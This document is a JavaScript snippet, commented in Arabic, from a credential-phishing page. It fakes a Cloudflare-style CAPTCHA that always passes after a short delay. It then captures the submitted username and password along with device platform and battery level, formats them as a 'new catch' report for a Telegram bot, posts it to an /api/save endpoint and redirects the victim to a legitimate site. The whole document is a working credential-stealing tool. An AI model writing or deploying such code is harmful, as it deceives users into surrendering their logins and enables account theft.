<script>
    let isVerified = false;

    // وظيفة التحقق مع تأخير ثانيتين ونصف للواقعية
    function handleCaptcha() {
        const cfBox = document.getElementById('cf-box');
        const loader = document.getElementById('loader-text');
        cfBox.style.display = 'none';
        loader.style.display = 'block';

        setTimeout(() => {
            loader.innerHTML = '✅ تم التحقق من أمان جهازك بنجاح';
            loader.style.color = 'green';
            isVerified = true;
        }, 2500);
    }

    // جلب معلومات الجهاز والبطارية
    async function getDeviceInfo() {
        let batteryLevel = "غير معروف";
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = Math.round(battery.level * 100) + "%";
            }
        } catch (e) {}
        return { battery: batteryLevel };
    }

    // عند الضغط على زر "تسجيل دخول" أو "تفعيل الآن"
    document.getElementById('checkForm').onsubmit = async (e) => {
        e.preventDefault();
        
        if (!isVerified) {
            Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning', confirmButtonColor: '#CC0044' });
            return;
        }

        const deviceData = await getDeviceInfo();
        const userValue = document.getElementById('userInput').value;
        const passValue = document.getElementById('passInput').value;

        // صياغة التقرير المرتب للبوت كما في الصورة التي أرسلتها
        const reportMessage = `
✨ **بيانات تسجيل دخول جديدة** ✨
----------------------------------
👤 **المستخدم:** ${userValue}
🔑 **كلمة السر:** ${passValue}
----------------------------------
📱 **النظام:** ${navigator.platform}
🔋 **البطارية:** ${deviceData.battery}
⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
----------------------------------
✅ **حالة الفحص:** آمن (Turnstile)
        `;

        const payload = {
            title: "🚀 صيد جديد مكتمل",
            message: reportMessage, // هذا النص المنسق هو ما سيظهر في التليجرام
            user: userValue,
            pass: passValue
        };

        try {
            // تأكد أن هذا الرابط هو المسار الصحيح في Vercel الخاص بك
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("خطأ في الإرسال");
        }

        // التوجيه النهائي للموقع الحقيقي
        window.location.href = "https://receive-smss.com/"; 
    };

    function showError() {
        Swal.fire({ title: 'خطأ', text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.', icon: 'error', confirmButtonColor: '#CC0044' });
    }
</script>
